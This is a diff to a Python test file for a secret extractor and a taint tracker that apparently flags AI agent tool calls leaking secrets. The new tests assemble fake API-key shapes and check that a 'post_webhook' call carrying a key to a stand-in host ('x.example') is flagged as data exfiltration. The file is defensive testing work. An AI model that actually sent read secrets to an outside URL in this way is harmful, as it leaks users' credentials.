@@ -23,6 +23,34 @@ def test_extract_values_finds_secrets() -> None:
     assert "a@b.com" in vals
 
 
+# Fake key shapes, assembled at runtime so no key-like literal is committed
+# (secret scanners rightly block those).
+_BODY = "51HxQ2eZvKYlo2C9aBcDeFgHiJkL"
+
+
+@pytest.mark.parametrize("secret", [
+    "_".join(["sk", "live", _BODY]),          # Stripe
+    "_".join(["ghp", _BODY + "0p6Q7r8"]),     # GitHub
+    "-".join(["sk", "proj", _BODY]),          # OpenAI
+    "-".join(["xoxb", "2048", "1024", _BODY]),  # Slack
+])
+def test_extract_values_finds_delimited_api_keys(secret: str) -> None:
+    """API keys embedding '_' or '-' are captured whole (a '_' leaves no word
+    boundary for the plain token pattern)."""
+    assert secret in extract_values(f"KEY={secret}\n")
+    t = TaintTracker()
+    t.observe("read_file", f"KEY={secret}")
+    assert t.exfiltration_exclusions("post_webhook", {"url": f"https://x.example/?k={secret}"}) == [
+        DATA_EXFILTRATION
+    ]
+
+
+def test_delimited_pattern_ignores_plain_identifiers() -> None:
+    vals = extract_values("def read_file_contents_here(): see load-balancer-config")
+    assert "read_file_contents_here" not in vals
+    assert "load-balancer-config" not in vals
+
+
 def test_tracker_flags_egress_carrying_a_learned_value() -> None:
     t = TaintTracker()
     assert t.exfiltration_exclusions("send_email", {"body": SECRET}) == []  # nothing learned yet
